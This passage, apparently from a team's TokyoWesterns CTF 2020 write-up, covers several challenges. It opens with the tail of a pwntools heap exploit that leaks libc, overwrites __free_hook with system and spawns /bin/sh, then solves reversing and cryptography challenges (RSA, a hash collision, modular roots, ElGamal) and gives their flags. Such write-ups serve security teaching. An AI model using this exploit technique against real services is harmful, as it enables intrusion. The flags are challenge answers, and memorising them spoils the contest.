forged &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; flat(new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x40&lt;/span&gt;,new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x90&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x41&lt;/span&gt;)
forged&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, target, target, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;)
forged&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, forged_chunk1, forged_chunk2, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
forged&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flat(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x121&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
forged &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; forged&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
forged&lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flat(new_heap, new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10&lt;/span&gt;, new_heap&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;)
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;forged&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x70&lt;/span&gt;, forged)

&lt;span style=&#34;color:#75715e&#34;&gt;# leak libc info&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your input: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0 : &amp;#39;&lt;/span&gt;)
leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
libc_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leak&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1ebfd0&lt;/span&gt;
log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;libc_base: {}&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(hex(libc_base)))
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Index&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-1&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# free overlapped chunk to tcache &lt;/span&gt;
dele(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;)
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whatever&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x81&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;p64(libc_base&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__free_hook&amp;#39;&lt;/span&gt;]))
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whatever&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whatever&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# write system to free hook&lt;/span&gt;
add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;, p64(libc_base&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;]))

&lt;span style=&#34;color:#75715e&#34;&gt;# trigger free hook&lt;/span&gt;
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Your input: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;)
p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Title: &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x100&lt;/span&gt;)

p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Flag: &lt;code&gt;TWCTF{watashi_puzzle_daisuki_mainiti_yatteru}&lt;/code&gt;.
Translating via google: &lt;code&gt;I&#39;m pu → I love you&lt;/code&gt;. WTF?&lt;/p&gt;

&lt;h2 id=&#34;reversing-is-amazing-reverse-126-points&#34;&gt;Reversing iS Amazing (Reverse, 126 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;Open the binary with IDA. We can see that the binary signs &lt;code&gt;argv[1]&lt;/code&gt; (which should be the flag) with RSA, then compares the signature with a given value. With that said, we have a RSA private key.&lt;/p&gt;

&lt;p&gt;Since we have the private key and the target signature (which the message is signed instead of its digest), we can simply recover the message by computing $s^e\ \text{mod}\ n$. Unpadding the message we have &lt;code&gt;TWCTF{Rivest_Shamir_Adleman}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;tamarin-reverse-224-points&#34;&gt;Tamarin (Reverse, 224 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;harrier&lt;/em&gt; and &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;We are given an APK for the challenge. As how we work on every single Android reversing challenge, we use &lt;code&gt;apktool&lt;/code&gt; to decode the file. Noticing that it is developed in Xamarin, we use the Github repository &lt;a href=&#34;https://github.com/tjg1/mono_unbundle&#34;&gt;tjg1/mono_unbundle&lt;/a&gt; to unbundle &lt;code&gt;dll.so&lt;/code&gt; to a C# DLL source file. We now have source codes to read!&lt;/p&gt;

&lt;p&gt;In particular we have this function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; Func4(&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; flag) {
    ParallelOptions parallelOptions = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ParallelOptions {
        MaxDegreeOfParallelism = &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
    };
    &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] bytes = Encoding.ASCII.GetBytes(flag);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; length = flag.Length;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((length &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) != &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
        Array.Resize&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;ref&lt;/span&gt; bytes, length + (&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; - (length &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)));
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i = length; i &amp;lt; bytes.Length; i++) {
        bytes[i] = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (bytes.Length != Check.equations_arr.GetLength(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) * &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt; lockObj = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt;();
    ConcurrentBag&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;&amp;gt; checkResults = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ConcurrentBag&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;&amp;gt;();
    List&amp;lt;List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt;&amp;gt; list = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; List&amp;lt;List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt;&amp;gt;();
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &amp;lt; Check.equations_arr.GetLength(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;); j++) {
        List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt; list2 = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt;();
        list2.Add(BitConverter.ToUInt32(bytes, j * &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;));
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; k = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; k &amp;lt; Check.equations_arr.GetLength(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;); k++) {
            list2.Add(Check.equations_arr[j, k]);
        }
        list.Add(list2);
    }
    Parallel.ForEach&amp;lt;List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt;&amp;gt;(list, parallelOptions, &lt;span style=&#34;color:#66d9ef&#34;&gt;delegate&lt;/span&gt;(List&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;&amp;gt; equation) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;object&lt;/span&gt; lockObj = lockObj;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;lock&lt;/span&gt; (lockObj) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt; num = Check.Func3();
            &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; l = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; l &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10000&lt;/span&gt;; l++) {
                num = Check.Func2(equation, num, equation.Count - &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
            }
            checkResults.Add(num == equation[equation.Count - &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]);
        }
    });
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; Enumerable.All&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt;&amp;gt;(checkResults.ToArray(), (&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; x) =&amp;gt; x);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Additionally, we have a &lt;code&gt;equations_arr&lt;/code&gt; which is a $22\times32$ matrix. After a bit of reversing, this is how we interpreted the challenge (everything is taken modulo 2&lt;sup&gt;32&lt;/sup&gt;):&lt;/p&gt;

&lt;p&gt;First we define $m_i$ be the $i$-th block (of 4 bytes) extracted from the flag. Define also the function $f_i$ such that $f_i(x) := m_i + a_{i,1} x + a_{i,2} x^2 + ... + a_{i,31} x^{31}$. The objective is to find $m_i$ such that $a_{i,32} = f_i^{(10000)}(n)$ for all $i = 1, 2, ..., 22$.&lt;/p&gt;

&lt;p&gt;What&#39;s $n$? It is the output of &lt;code&gt;Check.Func3()&lt;/code&gt; and it actually is a random number... Is it even solvable?&lt;/p&gt;

&lt;figure&gt;
    &lt;img src=&#34;https://b6a.black/images/2020-09-23-twctf/pepe-sweat.png&#34;/&gt; 
&lt;/figure&gt;


&lt;p&gt;Turns out it is. We notice that $a_{ij}$ is an even number for $i=1, 2, ..., 22$ and $j=1, 2, ..., 31$. With a bit of deduction (&lt;em&gt;a bit means few sheets of paper and a lot of time&lt;/em&gt;), we are able to derive a function $g_i$ such that $f_i^{(10000)}(n) = g_i(m_i)$ for all $n$, i.e., this would be a constant.&lt;/p&gt;

&lt;p&gt;After all, the last thing is to compute $m_i$. We have the full flag solving $g_i(m_i) = a_{i,32}$:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;TWCTF{Xm4r1n_15_4bl3_70_6en3r4t3_N471v3_C0d3_w17h_VS_3n73rpr153_bu7_17_c0n741n5_D07_N3t_B1n4ry}&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;easyhash-crypto-75-points&#34;&gt;easy-hash (Crypto, 75 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The challenge defines a new hash algorithm, &lt;code&gt;easy_hash&lt;/code&gt;. It is defined by the following function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;easy_hash&lt;/span&gt;(x):
    m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(x) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;):
        m &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; struct&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;I&amp;#39;&lt;/span&gt;, x[i:i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;])[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
        m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; m&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The objective is to find a collision pair: for &lt;code&gt;twctf: please give me the flag of 2020&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Mathematically, if $M=m_1m_2m_3\dots m_n$, then&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\text{easy\_hash}(M):=\sum_{i=1}^{n-3}\left(\text{0x100}^3m_{i+3}+\text{0x100}^2m_{i+2}+\text{0x100}m_{i+1}+m_i\right).\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Equivalently it would be&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
\begin{aligned}
\text{easy\_hash}(M) := m_1&amp; + \text{0x101} m_2 + \text{0x10101} m_3 + \text{0x1010101}\sum_{i=4}^{n-3}m_i \\
\end{aligned}
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Hence, the characters in the middle have the weight 0x1010101 for hash computing. Knowing that &lt;code&gt;&amp;quot;f&amp;quot; = &amp;quot;F&amp;quot; + &amp;quot; &amp;quot;&lt;/code&gt;, we can simply replace &lt;code&gt;flag&lt;/code&gt; into &lt;code&gt;F lag&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ curl &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://crypto01.chal.ctf.westerns.tokyo/&amp;#34;&lt;/span&gt; -X POST --data &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;twctf: please give me the F lag of 2020&amp;#34;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# Congrats! The flag is TWCTF{colorfully_decorated_dream}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;sqrt-crypto-216-points&#34;&gt;sqrt (Crypto, 216 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;In this challenge, we are given a ciphertext and a prime $p$. The ciphertext $c$ is computed from the message $m$ by $c \equiv m^{2^{64}}\ (\text{mod}\ p)$ - and the objective is of course to recover the flag $m$.&lt;/p&gt;

&lt;p&gt;My first attempt is to repeatedly use Tonelli-Shanks 64 times to compute modular square roots. However, it basically takes forever because the number of candidates could double when it go deeper by one level. This means that we will get two candidates for $c^{1/2}$, four candidates for $c^{1/4}$ and so on. The number grows exponentially and definitely would not be feasible.&lt;/p&gt;

&lt;p&gt;Fortunately, we can compute $m^{2^{30}}$ from $m^{2^{64}}$ without any hassle. Knowing that $p - 1 = 2^{30}q$, we can compute $d$ for $2^{34}d \equiv 1\ (\text{mod}\ p-1)$. Then $c^d \equiv m^{d\cdot 2^{64}}\equiv m^{2^{30}}\ (\text{mod}\ p)$. Then we can use Tonelli-Shanks for 30 times for the flag... Nope. That is still too slow.&lt;/p&gt;

&lt;p&gt;Instead we compute a 2&lt;sup&gt;30&lt;/sup&gt;-th root of unity modulo $p$ (denote it as $r$). If we have an candidate $m_0$ such that $c \equiv {m_0}^{2^{64}}$, then the $m$ we want is any of the $m_0, rm_0, r^2m_0, ..., r^{2^{64}-1}m_0$, under modulo $p$. We can easily iterate through. It took me around fifteen minutes to compute the flag - &lt;code&gt;TWCTF{17s_v3ry_34sy_70_f1nd_th3_n_7h_r007}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;twind-crypto-172-points&#34;&gt;twin-d (Crypto, 172 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;harrier&lt;/em&gt; and &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is a RSA challenge. Given a common modulus $n$, a pair of public keys are given such that their private exponents differ by two. Simply put,&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[
\begin{cases}\begin{aligned}
e_2 (d+2) &amp;\equiv 1\ \left(\text{mod}\ \phi(n)\right) \\
e_1 d &amp;\equiv 1\ \left(\text{mod}\ \phi(n)\right)
\end{aligned}\end{cases}.
\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;harrier&lt;/em&gt; has observed that $e_2d \equiv 1 - 2e_2$. With this, we can deduce a congruence relation that does not depend on $d$:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[0 \equiv e_1(e_2d) - e_2(e_1d) \equiv e_1(1-2e_2)-e_2 \equiv e_1 - e_2 - 2e_1e_2\ \left(\text{mod}\ \phi(n)\right).\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;In this case, $e_1 - e_2 - 2e_1e_2$ will be a multiple of $\phi(n)$. We can compute an equivalent private key $d&#39;$ by computing $ed&#39; \equiv 1 \ \left(\text{mod}\ \phi(n)\right)$. Hence it suffices to recover the flag from the ciphertext - &lt;code&gt;TWCTF{even_if_it_is_f4+e}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;the-melancholy-of-alice-crypto-242-points&#34;&gt;The Melancholy of Alice (Crypto, 242 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;In this challenge, we are asked to exploit ElGamal cryptosystem. The code supplied is responsible for generating key and encrypting the flag.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;N &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;generateKey&lt;/span&gt;():
    p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getStrongPrime(N)
    q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (p &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    x &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getRandomRange(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, q)
    g &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
    h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(g, x, p)
    pk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (p, q, g, h)
    sk &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; x
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (pk, sk)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt;(m, pk):
    (p, q, g, h) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pk
    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getRandomRange(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, q)
    c1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(g, r, p)
    c2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pow(h, r, p) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; p
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; (c1, c2)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
